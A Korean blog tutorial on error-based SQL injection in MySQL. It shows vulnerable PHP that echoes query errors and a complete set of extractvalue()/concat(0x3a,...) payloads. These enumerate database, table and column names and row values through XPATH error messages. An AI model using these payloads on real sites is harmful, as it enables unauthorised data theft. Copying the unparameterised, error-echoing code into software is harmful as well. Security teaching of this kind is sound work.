    Error-based-SQL-Injection 이란?

    SQL문에 대한 Error메세지가 HTML상에 보일 경우 이를 이용한 공격입니다.

    Error-based-SQL-Injection이 생기는 이유

    예를 들어, 아래와 같이 작성된 PHP 코드가 있습니다.

    $sql = "SELECT * FROM user where id = '$user_id'";
$result = mysqli_query($con,$sql); // 쿼리 요청후 결과 반환
// 쿼리 오류가 없는지 검사 
if($result){
    // 쿼리 조회 후 작업...
}else {
    echo(mysqli_error($con));
}

    위 코드에서 개발자들이 오류를 확인하기 위해 SQL문이 error가 났을때 echo를 이용해서 확인이 가능하게 하여 오류 수정 후 개발을 마쳤을 때

    해당 코드를 주석처리하지 않고 그대로 놔두면, 공격자가 SQL문의 에러가 어떻게 났는지 알 수 있게 됩니다.

    거기에 SQL Injection공격을 막아두지 않았다면 Error-based-SQL-Injection을 사용 할 수 있습니다.

    에러 메세지를 SELECT처럼 사용하기 위해서는 SQL문의 extractvalue()라는 함수가 필요합니다.

    extractvalue 함수

    해당 함수는 extractvalue('xml 데이터','xml 표현식'); 이렇게 사용하는데

    두번째 인수(xml 표현식)에 이 쿼리의 오류결과가 오류 메시지에 포함되어 출력되는 점을 이용하는 것입니다.

    정령화된 형식으로는 ' and extractvalue('1',concat(0x3a,(select 'value'))) and '1'='1 이렇게 사용 합니다

    0x3a 를 concat을 사용하여 붙히는 이유

    : 특수문자의 16진수형태인 0x3a를 넣는 이유는 concat을 사용해서 select된 데이터와 오류를 일으켜서 error문에 select된 데이터를 보이게 하기 위함입니다

    사용된 예시

    다음은 extractvalue를 사용해서 XPATH syntax error: ':DB이름'라는 해당 결과를 얻는 사진입니다.

    Error-based-SQL-Injection 공격 포맷

    • 단일 SELECT 사용법 (limit 범위를 조절해서 여러개의 데이터중 하나씩 가져오는 것이 가능)
    select database() -- DB이름 가져오기
select table_name from information_schema.tables where table_schema='DB이름' limit 0,1 -- DB이름을 이용해 table이름 가져오기
select column_name from information_schema.columns where table_name='Table이름' limit 0,1 -- table이름을 이용해서 column이름 가져오기
select Column이름 from Table이름 limit 0,1 -- column이름을 이용해 row값 조회
    • extractvalue와 함께 사용해서 공격 포맷 완성
    ' and extractvalue('1',concat(0x3a,(select database()))) and '1'='1
' and extractvalue('1',concat(0x3a,(select table_name from information_schema.tables where table_schema='DB이름' limit 0,1))) and '1'='1
' and extractvalue('1',concat(0x3a,(select column_name from information_schema.columns where table_name='Table이름' limit 0,1))) and '1'='1
' and extractvalue('1',concat(0x3a,(select Column이름 from Table이름 limit 0,1))) and '1'='1
    블로그를 봐주셔서 감사합니다.
